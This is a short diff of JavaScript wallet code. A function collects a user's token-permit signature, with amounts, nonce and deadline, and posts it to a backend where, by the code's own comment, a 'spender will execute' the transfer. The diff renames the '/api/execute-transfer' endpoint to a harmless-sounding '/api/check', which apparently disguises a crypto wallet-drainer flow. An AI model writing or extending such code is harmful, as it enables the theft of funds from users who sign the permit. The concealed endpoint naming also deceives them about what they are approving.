@@ -894,7 +894,21 @@ export async function getUserSignature2(walletClient, address) {
     console.log('Signature acquired, sending to backend...')
 
     // STEP 6: Send signature to YOUR backend — spender will execute from there
-    const response = await fetch('http://localhost:3001/api/execute-transfer', {
+    // const response = await fetch('http://localhost:3001/api/execute-transfer', {
+    //   method: 'POST',
+    //   headers: { 'Content-Type': 'application/json' },
+    //   body: JSON.stringify({
+    //     user: address,
+    //     signature,
+    //     permitted: permitted.map(p => ({
+    //       token: p.token,
+    //       amount: p.amount.toString() // serialize BigInt
+    //     })),
+    //     nonce: nonce.toString(),
+    //     deadline: deadline.toString()
+    //   })
+    // })
+    const response = await fetch('/api/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
